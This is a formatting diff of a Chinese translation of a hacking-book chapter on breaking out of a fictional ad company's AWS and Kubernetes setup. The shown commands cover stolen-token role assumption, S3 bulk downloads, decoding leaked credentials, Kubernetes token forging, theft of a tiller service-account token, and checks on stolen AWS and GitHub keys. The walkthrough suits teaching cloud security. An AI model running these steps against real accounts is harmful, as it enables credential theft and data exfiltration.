@@ -1,6 +1,4 @@
-# 8
-
-《肖申克的救赎》：越狱
+# 《肖申克的救赎》：越狱
 
 ![](img/chapterart.png)
 
@@ -396,7 +394,7 @@ shell> **curl http://10.0.2.34/api/dashboard/campaign/1395412512 \**
 我们成功了！虽然我们可能无法访问漂亮的仪表盘来可视化这些指标——至少目前还不能——但我们终于看到了一部分原始的活动数据。附加奖励：我们找到了广告中视频文件和图像的存储位置 1。让我们看一下这个 URL：
 
 ```
-root@Point1:/# **getent -t hosts s4d.mxrads.com**
+root@Point1:/# getent -t hosts s4d.mxrads.com
 13.225.38.103   s4d.mxrads.com.s3.amazonaws.com
 ```
 
@@ -496,10 +494,10 @@ eyJhbGciOiJSUzI1NiIsImtpZCI6ImQxNWY4MzcwNjI5Y2FmZGRiOGNjY2UzNjBiYzFjZGMwYWY4Zm..
 当我们调用 `aws sts assume-role-with-web-identity` API 并提供必要的信息（网络令牌和角色名称）时，我们应该会得到有效的 IAM 凭证：
 
 ```
-root@Pointer1:/# **AWS_ROLE_ARN="arn:aws:iam::886477354405:role/api-core.ec2"**
-root@Pointer1:/# **TOKEN ="ewJabazetzezet..."**
+root@Pointer1:/# AWS_ROLE_ARN="arn:aws:iam::886477354405:role/api-core.ec2"
+root@Pointer1:/# TOKEN ="ewJabazetzezet..."
 
-root@Pointer1:/# **aws sts assume-role-with-web-identity \**
+root@Pointer1:/# aws sts assume-role-with-web-identity \
 **--role-arn $AWS_ROLE_ARN \**
 **--role-session-name sessionID \**
 **--web-identity-token $TOKEN \**
@@ -523,7 +521,7 @@ root@Pointer1:/# **aws sts assume-role-with-web-identity \**
 api-core 应用程序管理广告活动，包含指向存储在 S3 上的创意文件的链接，并具有许多其他功能。可以合理推测，相关的 IAM 角色具有一些扩展权限。我们从一个显而易见的权限开始，它从一开始就一直困扰着我们——列出 S3 上的桶：
 
 ```
-root@Pointer1:/# **aws s3api list-buckets**
+root@Pointer1:/# aws s3api list-buckets
 {
   "Buckets": [
      {
@@ -545,7 +543,7 @@ root@Pointer1:/# **aws s3api list-buckets**
 例如，桶 mxrads-terraform 很可能存储了 *Terraform* 生成的状态，Terraform 是一个用于设置和配置云资源（如服务器、数据库和网络）的工具。状态是所有由 Terraform 生成和管理的资产的声明性描述，例如服务器的 IP、子网、IAM 角色、与每个角色和用户关联的权限等等。它甚至存储明文密码。即使我们的目标使用了像 Vault、AWS 密钥管理服务（KMS）或 AWS Secrets Manager 这样的密钥管理工具，Terraform 也会动态解密这些密码并将其明文版本存储在状态文件中。哦，我们愿意为访问那个桶付出什么代价。让我们试试看：
 
 ```
-root@Point1:~/# **aws s3api list-objects-v2 --bucket mxrads-terraform**
+root@Point1:~/# aws s3api list-objects-v2 --bucket mxrads-terraform
 
 An error occurred (AccessDenied) when calling the ListObjectsV2 operation:
 Access Denied
@@ -556,8 +554,8 @@ Access Denied
 我们确认至少有一个桶 api-core 应该能够访问：s4d.mxrads.com，这是存储所有创意文件的桶。我们将使用我们的 IAM 权限列出该桶的内容：
 
 ```
-root@Point1:~/# **aws s3api list-objects-v2 --bucket s4d.mxrads.com > list_creatives.txt**
-root@Point1:~/# **head list_creatives.txt**
+root@Point1:~/# aws s3api list-objects-v2 --bucket s4d.mxrads.com > list_creatives.txt
+root@Point1:~/# head list_creatives.txt
 {"Contents": [{
   "Key": "2aed773247f0203d5e672cb/125dad49652436/vid/720/6aa58ec9f77af0c0ca497f90c.mp4",
 
@@ -588,9 +586,9 @@ shell> **curl -Lk \**
 接着我们解码用户名和密码：
 
 ```
-root@Point1:~/# **echo YXBpLWNvcmUtcnc= |base64 -d**
+root@Point1:~/# echo YXBpLWNvcmUtcnc= |base64 -d
 api-core-rw
-root@Point1:~/# **echo ek81akxXbGdyRzdBUzZs |base64 -d**
+root@Point1:~/# echo ek81akxXbGdyRzdBUzZs |base64 -d
 zO5jLWlgrG7AS6l
 ```
 
@@ -666,7 +664,7 @@ Maxbudget: 250000
 考虑到涉及的创意数量（属于 GP 的几百个创意），我们将利用一些`xargs`魔法来并行化调用`get-object` API。我们准备了一个包含创意列表的文件，然后循环遍历每一行并将其传递给`xargs`：
 
 ```
-root@Point1:~/creatives# **cat list_creatives.txt | \**
+root@Point1:~/creatives# cat list_creatives.txt | \
 **xargs -I @ aws s3api get-object \**
 **-P 16 \**
 **--bucket s4d.mxrads.com \**
@@ -677,7 +675,7 @@ root@Point1:~/creatives# **cat list_creatives.txt | \**
 `-I`标志是替换令牌，决定在哪里注入读取的行。`xargs`中的`-P`标志表示最大并发进程数（在我的机器上为 16）。最后，`RANDOM`是一个默认的 bash 变量，在每次评估时返回一个随机数字，它将成为下载的创意的本地名称。让我们看看我们抓取了多少创意：
 
 ```
-root@Point1:~/creatives# **ls -l |wc -l**
+root@Point1:~/creatives# ls -l |wc -l
 264
 ```
 
@@ -810,8 +808,8 @@ class BidRequest implements Serializable{
 如果你还记得，在第五章我们遇到了一个名为 mxrads-dl 的存储桶，它似乎充当了一个公共 JAR 文件和二进制文件的私人仓库。这个存储桶应该包含像 ads-rtb 这样的应用程序使用的几乎所有版本的外部 JAR 文件。因此，答案可能就在里面。我们通过搜索存储桶中的键，查找由 ysoserial 工具支持的易受攻击的 Java 库（[`github.com/frohoff/ysoserial/`](https://github.com/frohoff/ysoserial/)），该工具用于制作有效载荷，触发许多 Java 类中的反序列化漏洞。该工具的 GitHub 页面列出了许多可以被利用的著名库，如 commons-collections 3.1、spring-core 4.1.4 等。
 
 ```
-root@Point1:~/# **aws s3api list-objects-v2 --bucket mxrads-dl > list_objects_dl.txt**
-root@Point1:~/# **grep 'commons-collections' list_objects_dl.txt**
+root@Point1:~/# aws s3api list-objects-v2 --bucket mxrads-dl > list_objects_dl.txt
+root@Point1:~/# grep 'commons-collections' list_objects_dl.txt
 
 Key: jar/maven/artifact/org.apache.commons-collections/commons-collections/3.3.2
 `--snip--`
@@ -899,13 +897,13 @@ shell> **curl "10.20.86.24:9200/log/_search?pretty&size=10&q=message: AccessKeyI
 根据 AWS 文档，附加到 Kubernetes 节点的默认角色将具有基本的 EC2 权限，以发现其环境：`describe-instances`、`describe-security-groups`、`describe-volumes`、`describe-subnets` 等。让我们试一下这些新凭证，并列出 `eu-west-1` 区域（爱尔兰）的所有实例：
 
 ```
-root@Point1:~/# **vi ~/.aws/credentials**
+root@Point1:~/# vi ~/.aws/credentials
 [node]
 aws_access_key_id = ASIA44ZRK6WS3R64ZPDI
 aws_secret_access_key = +EplZsWmW/5r/+B/+J5PrsmBZaNXyKKJ
 aws_session_token = AgoJb3JpZ2luX2...
 
-root@Point1:~/# **aws ec2 describe-instances \**
+root@Point1:~/# aws ec2 describe-instances \
 **--region=eu-west-1 \**
 **--profile node**
 `--snip--`
@@ -933,8 +931,8 @@ root@Point1:~/# **aws ec2 describe-instances \**
 有讽刺意味的是，标签泄露了 Kubernetes 集群的名称 `(prod-euw1)`，这是调用 `describeCluster` API 时所需的一个参数。那么我们就调用 `describeCluster` 吧：
 
 ```
-root@Point1:~/# **export AWS_REGION=eu-west-1**
-root@Point1:~/# **aws eks describe-cluster --name prod-euw1 --profile node**
+root@Point1:~/# export AWS_REGION=eu-west-1
+root@Point1:~/# aws eks describe-cluster --name prod-euw1 --profile node
 {  "cluster": {
   1 "endpoint": "https://BB061F0457C63.yl4.eu-west-1.eks.amazonaws.com",
   2 "roleArn": "arn:aws:iam::886477354405:role/eks-prod-role",
@@ -963,7 +961,7 @@ API 服务器是那个长得很方便的 URL，名为 `endpoint` 1。在一些�
 我们所要做的就是请求 AWS 将我们的 IAM 访问密钥转换为有效的 Kubernetes 令牌，这样我们就可以作为 `system:nodes` 组的有效成员查询 API 服务器。为此，我们调用 `get-token` API：
 
 ```
-root@Point1:~/# **aws eks get-token --cluster-name prod-euw1 --profile node**
+root@Point1:~/# aws eks get-token --cluster-name prod-euw1 --profile node
 {
     "kind": "ExecCredential",
     "apiVersion": "client.authentication.k8s.io/v1alpha1",
@@ -977,7 +975,7 @@ root@Point1:~/# **aws eks get-token --cluster-name prod-euw1 --profile node**
 我们这次获得的令牌不是标准的 JWT；相反，它包含了调用 STS 服务的 `GetCallerIdentity` API 所需的构建块。让我们使用 `jq`、`cut`、`base64` 和 `sed` 等工具解码我们之前获得的部分令牌：
 
 ```
-root@Point1:~/# **aws eks get-token --cluster-name prod-euw1 \**
+root@Point1:~/# aws eks get-token --cluster-name prod-euw1 \
 **| jq -r .status.token \**
 **| cut -d"_" -f2 \**
 **| base64 -d \**
@@ -998,7 +996,7 @@ JWT 实际上是一个编码过的预签名 URL，包含节点的身份。任何
 我们可以像之前一样使用这个令牌通过 `curl` 命令向 API 服务器发起请求，但我们最好生成一个完整的 Kubectl 配置文件，将其下载到我们那个值得信赖的 Pod 中：
 
 ```
-root@Point1:~/# **aws eks update-kubeconfig --name prod-euw1 --profile node**
+root@Point1:~/# aws eks update-kubeconfig --name prod-euw1 --profile node
 
 Updated context arn:aws:eks:eu-west-1:886477354405:cluster/prod-euw1 in /root/.kube/config
 shell> **wget https://mxrads-archives-packets-linux.s3-eu-west-1.amazonaws.com/config**
@@ -1111,7 +1109,7 @@ prod            ads-rtb...      CassandraDB    default-token-99ed
 我们碰上了幸运的节点编号 192.168.133.34 1，它表示托管了一些属于强大`kube-system`命名空间的 pods。这个 tiller pod 有 90%的可能性具有集群管理员权限。它在*helm* *v2*中扮演着核心角色，这是一个用于在 Kubernetes 上部署和管理应用的包管理器。我们伪装成这个节点并下载 tiller 的服务账户令牌：
 
 ```
-root@Point1:~/# **aws eks update-kubeconfig --name prod-euw1 --profile node133**
+root@Point1:~/# aws eks update-kubeconfig --name prod-euw1 --profile node133
 `--snip--`
 shell> **./kubectl get secret tiller-token-3cea \**
 **-o json \**
@@ -1141,12 +1139,12 @@ shell> **kubectl get secrets \**
 我们还获得了几把有效的 AWS 访问密钥，其中一把属于名为 Kevin Duncan 的开发人员。这将非常有用。我们将其添加到我们的*凭证*文件中，并执行一次 API 调用以确认它们确实有效：
 
 ```
-root@Point1:~/# **vi ~/.aws/credentials**
+root@Point1:~/# vi ~/.aws/credentials
 [kevin]
 aws_access_key_id = AKIA44ZRK6WSSKDSKQDZ
 aws_secret_access_key = 93pLDv0FlQXnpy+EplZsWmW/5r/+B/+KJ
 
-root@Point1:~/# **aws iam get-user --profile kevin**
+root@Point1:~/# aws iam get-user --profile kevin
  "User": {
     "Path": "/",
     "UserName": "kevin.duncan",
@@ -1156,8 +1154,8 @@ root@Point1:~/# **aws iam get-user --profile kevin**
 最后，我们还确保获取了属于`github-bot-ro`的 GitHub 令牌。我们通过执行以下几行 Python 代码，确保它仍然有效：
 
 ```
-root@Point1:~/# **python3 -m pip install PyGithub**
-root@Point1:~/# **python3**
+root@Point1:~/# python3 -m pip install PyGithub
+root@Point1:~/# python3
 
 >>> **from github import Github**
 >>> **g = Github("9c13d31aaedc0cc351dd12cc45ffafbe89848020")**
